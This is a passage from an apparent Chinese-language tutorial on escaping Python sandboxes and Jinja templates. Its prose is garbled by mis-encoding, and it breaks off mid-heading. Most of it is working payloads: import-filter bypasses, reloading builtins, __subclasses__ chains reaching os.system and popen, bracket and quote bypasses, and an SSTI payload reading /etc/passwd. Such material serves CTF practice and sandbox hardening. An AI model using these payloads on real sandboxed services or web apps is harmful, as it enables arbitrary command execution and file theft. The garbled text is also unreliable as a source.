&apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;]methods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]results = {}for module in all_modules_3:    results[module] = {        &apos;flag&apos;: 0,        &apos;result&apos;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                result = &apos;yes&apos;                results[module][&apos;flag&apos;] = 1            else:                result = &apos;no&apos;            results[module][&apos;result&apos;][method] = result    except Exception as e:        print(e)for result in results:    if results[result][&apos;flag&apos;]:        print(&apos;[+]&apos; + result)        for r in results[result][&apos;result&apos;]:            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>ä»ç»“æœå¯ä»¥çœ‹åˆ°æœ‰ç›¸å½“å¤§ä¸€éƒ¨åˆ†æ¨¡å—éƒ½å¯¼å…¥äº†â€œå±é™©â€çš„å‡½æ•°ã€‚åªè¦æˆ‘ä»¬å¯ä»¥ <code>import</code> é‚£ä¹ˆå­˜åœ¨è¿™äº›æ¨¡å—çš„ç¯å¢ƒå°±æ˜¯å±é™©çš„ã€‚</p><h3 id="å¦‚æœæˆ‘ä»¬æ²¡åŠæ³•-import-å‘¢ï¼Ÿ"><a href="#å¦‚æœæˆ‘ä»¬æ²¡åŠæ³•-import-å‘¢ï¼Ÿ" class="headerlink" title="å¦‚æœæˆ‘ä»¬æ²¡åŠæ³• import å‘¢ï¼Ÿ"></a>å¦‚æœæˆ‘ä»¬æ²¡åŠæ³• import å‘¢ï¼Ÿ</h3><p>å¦‚æœåªæ˜¯ç®€å•çš„ç¦ç”¨ <code>import os</code> æˆ‘ä»¬å¯ä»¥åŠ ç©ºæ ¼ç»•è¿‡ <code>import   os</code> .</p><p>å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†æˆ‘ä»¬è¿˜å¯ä»¥ <code>__import__(&#39;os&#39;)</code>.</p><p>å¦‚æœè¿‡æ»¤ os æˆ‘ä»¬è¿˜å¯ä»¥ <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>ã€‚</p><p>å¦‚æœè¿™ä¹Ÿä¸è¡Œè¿˜æœ‰ <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p><p>è”æƒ³åˆ°æˆ‘ä»¬ä¸Šé¢è¯´çš„ <code>__builtin__/__builtins__</code>,ä¸€äº›å±é™©å†…å»ºå‡½æ•°éƒ½å¯ä»¥ç›´æ¥ç”¨ï¼Œå¦‚æœè¿™äº›å‡½æ•°éƒ½è¢« del æ‰æˆ‘ä»¬å¯ä»¥ <code>reload(__builtin__)</code> æ¥é‡è½½ä¸€ä¸ªå®Œæ•´çš„ <code>__builtin__</code>.</p><p>reload ä¹Ÿæ˜¯å†…å»ºå‡½æ•°ï¼Œå¦‚æœè¿™ä¹Ÿæ²¡äº†å‘¢ï¼Ÿ </p><pre><code>import impimp.reload(__builtin__)</code></pre><p>ä¹Ÿå¯ä»¥å¼•å…¥ã€‚</p><p>å¦‚æœ <code>sys.modules[&#39;os&#39;]=None</code> ä»æ ¹æºåˆ é™¤å‘¢ï¼Ÿ</p><p>å®é™…ä¸Šè”ç³»åˆ° import çš„åŸç†</p><blockquote><p>å¦‚æœæ˜¯ import Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ A<br>å¦‚æœæ˜¯ from A import Bï¼Œå…ˆä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå†è§£æAï¼Œä»ä¸­å¯»æ‰¾Bå¹¶å¡«å……åˆ° A çš„ dict ä¸­</p></blockquote><p>å¦‚æœ <code>sys</code> å¯ä»¥ç”¨çš„è¯å¯ä»¥å…ˆç¡®è®¤ä¸€ä¸‹è·¯å¾„</p><pre><code>import sysprint(sys.path)</code></pre><p>æœ¬è´¨ä¸Šæ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç”¨ <code>execfile</code> æ¥ä»£æ›¿</p><pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)system(&apos;ls&apos;)</code></pre><p>3.x ä¸­åˆ é™¤äº† execfile ï¼Œä¸è¿‡å¯ä»¥è¿™æ ·ï¼š</p><pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:    exec(f.read())system(&apos;ls&apos;)</code></pre><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šå½“æˆ‘ä»¬ä½¿ç”¨ del sys.modules[â€˜osâ€™] æ—¶æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› ä¸ºåœ¨import æ—¶ä¼šåœ¨æ£€æµ‹åˆ°ä¸å­˜åœ¨ os æ—¶é‡è½½ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥</p><pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj ä¸ºä½ åŠ çš„del sys.modules[&apos;os&apos;]import osos.system(&apos;ls&apos;)</code></pre><h3 id="å…¶ä»–ä¸€äº›å°æŠ€å·§"><a href="#å…¶ä»–ä¸€äº›å°æŠ€å·§" class="headerlink" title="å…¶ä»–ä¸€äº›å°æŠ€å·§"></a>å…¶ä»–ä¸€äº›å°æŠ€å·§</h3><ol><li><p>è¿‡æ»¤æ‰æ•´ä¸ªåŒ¹é…è¯­å¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡æ›¿æ¢çš„æ–¹å¼</p><p> a = open<br> print(a(â€œd:/test.txtâ€).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1â€¦</type></mount></file></p></li><li><p>å‡½æ•°åé¢åŠ ç©ºæ ¼ã€æ¢è¡Œéƒ½èƒ½æ‰§è¡Œ</p></li><li><p>å¦‚æœç¨‹åºä¸­è°ƒç”¨äº†ç¬¬ä¸‰æ–¹çš„åº“ï¼Œæ°å¥½è¿™ä¸ªåº“æœ‰æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°</p><p> from numpy.distutils.exec_command import _exec_command as system</p><p> system(â€œls /â€œ)</p></li><li><p>ä½¿ç”¨åˆ«å</p><p> import os as o</p></li><li><p>å­—ç¬¦ä¸²æ‹¼æ¥</p><p> â€œlâ€+â€sâ€</p><p> â€œfunc_globalâ€+â€sâ€</p></li><li><p>å­—ç¬¦ä¸²ç¼–ç æˆ–è€…å…¶ä»–æ“ä½œ</p><p> â€˜X19pbXBvcnRfXw==â€™.decode(â€˜base64â€™) //<strong>import</strong></p><p> <strong>import</strong>(â€˜soâ€™[::-1]).system(â€˜lsâ€™)</p><p> eval(â€˜)â€imaohwâ€(metsys.)â€soâ€(<strong>tropmi</strong>â€˜[::-1])</p><p> exec(â€˜)â€imaohwâ€(metsys.so ;so tropmiâ€™[::-1])</p></li></ol><h2 id="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸"><a href="#é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸" class="headerlink" title="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸"></a>é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸</h2><p>é€šè¿‡ Python çš„ç»§æ‰¿å…³ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³åˆ©ç”¨çš„æ¨¡å—è¢«æ€äº†ä¹‹åæˆ‘ä»¬æƒ³åŠæ³•æ„é€ ä¸€æ¡åˆ°åŸºç±»çš„é“¾ç„¶åå†è‡ªé¡¶å‘ä¸‹é‡æ–°æ‰¾åˆ°ä¸€ä¸ªå¯è¡Œçš„è·¯æ¥ä½¿ç”¨ç›®æ ‡æ¨¡å—ã€‚ </p><p>python ç±»ä¸­æœ‰ä¸ªå±æ€§å« <strong>mro</strong> ,æ˜¯ä¸ªå…ƒç»„è®°å½•äº†ç»§æ‰¿å…³ç³»ã€‚</p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>é€šè¿‡æ–‡ç« æœ€å¼€å§‹çš„ä»‹ç»æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡ä½¿ç”¨ <code>__base__</code> æ¥æ‰¾åˆ°åŸºç±» <code>object</code></p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__&lt;type &apos;object&apos;&gt;</code></pre><p>ç„¶åä»åŸºç±»å‘ä¸‹å›æº¯ï¼Œä½¿ç”¨ <code>__subclasses__</code></p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>æˆ‘ä»¬å‘ç°ç»“æœå¤ªå¤šäº†ï¼Œç½‘ä¸Šæ‰¾åˆ° bendawang å¸ˆå‚…çš„è„šæœ¬æ¥å¾ªç¯æ‰¾ä¸€ä¸‹</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__():    try:        if &apos;os&apos; in item.__init__.__globals__:            print cnt,item        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>åˆ©ç”¨è¿™ä¸ªæ¥æ‰¾åˆ° <code>os</code> æ¨¡å—çš„å…¥å£</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():    try:        cnt2=0        for i in item.__init__.__globals__:            if &apos;eval&apos; in item.__init__.__globals__[i]:                print cnt,item,cnt2,i            cnt2+=1        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>è¿™ä¸ªç›¸å½“äºæ›´æ·±å…¥ä¸€å±‚æŸ¥æ‰¾</p><p>å­˜åœ¨çš„å­æ¨¡å—å¯ä»¥é€šè¿‡ .index() æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨è¿”å›ç´¢å¼•</p><pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x ç‰ˆæœ¬ä¸­æœ‰ä¸€ä¸ª warnings </p><pre><code>&gt;&gt;&gt; import warnings&gt;&gt;&gt; warnings.osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;module&apos; object has no attribute &apos;os&apos;&gt;&gt;&gt; warnings.linecache&lt;module &apos;linecache&apos; from &apos;F:\python2.7\lib\linecache.pyc&apos;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module &apos;os&apos; from &apos;F:\python2.7\lib\os.pyc&apos;&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥</p><pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>ç®€å•çš„ç»™åŸºç±»çš„æ‰€æœ‰æ¨¡å—ç¼–å·</p><pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>å¦‚ä½•ä¾¿æ·çš„æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„å…¥å£</p><pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id="å¤§ä½¬ä»¬çš„payload"><a href="#å¤§ä½¬ä»¬çš„payload" class="headerlink" title="å¤§ä½¬ä»¬çš„payload"></a>å¤§ä½¬ä»¬çš„payload</h3><ol><li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li><li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li><li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li><li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li><li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li></ol><h3 id="è¿‡æ»¤ä¸­æ‹¬å·"><a href="#è¿‡æ»¤ä¸­æ‹¬å·" class="headerlink" title="è¿‡æ»¤ä¸­æ‹¬å·"></a>è¿‡æ»¤ä¸­æ‹¬å·</h3><p>å¦‚æœç¢°åˆ°è¿‡æ»¤ <code>[ ]</code> ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>[]</code> çš„åŠŸèƒ½ç”¨ <code>pop</code> ã€ <code>__getitem__</code>ä»£æ›¿ï¼ˆå®é™…ä¸Š <code>a[0]</code> åœ¨å†…éƒ¨å°±æ˜¯è°ƒç”¨äº† <code>a.__getitem__(0)</code> ï¼‰ï¼Œ<code>pop()</code> å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼</p><pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h3><p>requests.args æ˜¯ flask ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠ path ä½œä¸ºå˜é‡åå°†åé¢çš„è·¯å¾„ä¼ è¿›æ¥ï¼Œæ¥ç»•è¿‡å¼•å·</p><pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id="è¿‡æ»¤åŒä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤åŒä¸‹åˆ’çº¿" class="headerlink" 